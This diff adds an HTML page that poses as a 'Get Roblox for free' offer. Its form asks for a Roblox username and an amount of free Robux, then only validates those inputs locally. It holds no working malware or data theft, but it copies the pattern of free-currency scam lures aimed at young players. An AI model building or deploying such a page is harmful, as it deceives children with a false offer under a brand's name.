@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>ROBLOX</title>
+  <style>
+    body {
+      text-align: center;
+    }
+    input {
+      padding: 12px;
+      width: 80%;
+      border-radius: 10px;
+      border: none;
+      background-color: #CECECE;
+      outline: none;
+    }
+    button {
+      width: 87%;
+      padding: 12px;
+      margin: 25px auto;
+      border-radius: 7px;
+      border: none;
+      background-color: #E12119;
+      color: whitesmoke;
+    }
+    
+    @media only screen and (min-width: 768px)  {
+      #username {
+        width: 30%;
+      }
+      
+      #amount {
+        width: 30%;
+      }
+      
+      button {
+        width: 32.5%;
+        display: block;
+      }
+      
+      body {
+        margin-top: 400px;
+      }
+    
+    hr {
+      width: 40%;
+    }
+}
+  </style>
+</head>
+<body>
+  <h1 style="margin-top: 100px;">ROBLOX</h1>
+  <h2 style="margin-top: -20px;">Get Roblox for free</h2>
+  <hr>
+  <p>Step 1: Type in your Roblox username to </br>continue</p>
+
+  <form id="robloxForm" onsubmit="return validateForm()">
+    <input type="text" id="username" placeholder="Roblox username" required>
+
+    <p>Step 2: Select how many free Robux</br> you want</p>
+    <input type="text" id="amount" placeholder="Roblox amount" required>
+
+    <button type="submit">Continue</button>
+  </form>
+
+  <script>
+    function validateForm() {
+      const username = document.getElementById("username").value;
+      const amount = document.getElementById("amount").value;
+
+      if (username.trim() === "") {
+        alert("Username must be filled out");
+        return false;
+      }
+
+      if (isNaN(amount) || amount.trim() === "") {
+        alert("Roblox amount must be a number");
+        return false;
+      }
+
+      return true; // If validation passes, allow form submission
+    }
+    
+    
+  </script>
+</body>
+</html>
